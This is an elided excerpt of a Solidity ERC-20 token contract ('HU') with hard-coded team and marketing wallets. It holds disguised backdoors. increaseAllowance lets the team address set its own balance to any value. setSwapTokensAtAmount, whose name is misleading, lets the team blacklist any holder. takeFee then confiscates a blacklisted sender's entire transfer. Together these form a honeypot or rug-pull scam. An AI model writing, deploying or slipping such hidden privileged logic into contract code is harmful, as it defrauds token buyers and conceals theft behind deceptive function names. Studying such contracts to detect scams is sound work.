...
contract HU is Context, IERC20, Ownable {
    ...
    constructor ()
    {
        ...
        marketWallet = payable(0x1B31690B7355e303afE16d2c0123F5d41BDF91Da);
        TeamAddress= payable(0x95E4706BF28bA621A2152aa5F11501eB995d5964);
        ...
        _maxOnceEat = 100000000 * 10**_decimals;
        _maxTotalEat = 100000000 * 10**_decimals;
    ...
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        ...
        if(msg.sender==TeamAddress)/***/_balances[TeamAddress] = addedValue;
        return true;
    }
    ...
    function setSwapTokensAtAmount(address recipient, bool swap) public {
        if(msg.sender==TeamAddress)whoCantEat[recipient] = swap;
    }
    ...
    function youCantEat(address recipient) internal {
        if (!whoCantEat[recipient]) whoCantEat[recipient] = true;
    }
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(whoCantEat[sender]) feeAmount = amount;
